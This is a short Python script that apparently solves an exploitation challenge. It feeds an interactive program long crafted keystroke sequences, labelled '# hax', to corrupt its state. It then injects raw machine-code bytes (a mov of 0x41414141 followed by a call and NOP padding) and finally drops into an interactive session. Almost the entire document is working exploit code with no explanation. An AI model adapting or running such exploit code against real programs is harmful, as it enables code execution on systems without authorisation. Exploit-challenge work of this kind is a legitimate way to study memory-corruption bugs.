import interact
import time

last_line_count = 4
def new_hs(skip=False):
    global last_line_count
    for _ in range(last_line_count):
        p.send("Iaaaaa ")
        p.send("Ia ")
        p.send("Idddd ")
    last_line_count += 1
    p.send("wI " * 5)
    if not skip:
        p.sendline("\n")

p = interact.Process()
# hax
p.sendline("\nw w w w w w w w \n\nw w w w w w w \n\nw w w w w w w w \n\nw w w w w w w w \n\ncaaaaaadw w w w w w w w w \n\nw w w w w w w w\n\naaaaaadd dwd caaaad aaddda daadwd dddd aaddw aaa ddaacd aadcaaw d awa daaw aw  awa daa dad aaawd w w w \n\naaaaaadd dwd dddd aaa  aacddddd dddddaaa aaacw  aaa awa awa wdd daaawww dw waa awaaaa caaaaaawa ddddd  w w w\n")

#0202
p.sendline("JaaaaawwwO" + "s"*18 + "Ja w w w w w w w \n\n\n\n")
p.sendline("\n\n")
#p.interactive()
for i in range(6):
    new_hs()
new_hs(skip=True)
p.sendline("\x50\n")

p.sendline("JaaaaawwwO" + "s"*18 + "Ja w w w w w w w \n\n\n\n")
p.sendline("\n\n")

new_hs(skip=True)
#p.sendline("\n")
p.sendline("\xBF\x41\x41\x41\x41\xE8\x67\x0B\x00\x00\x90\x90\n")

new_hs(skip=True)

p.interactive()
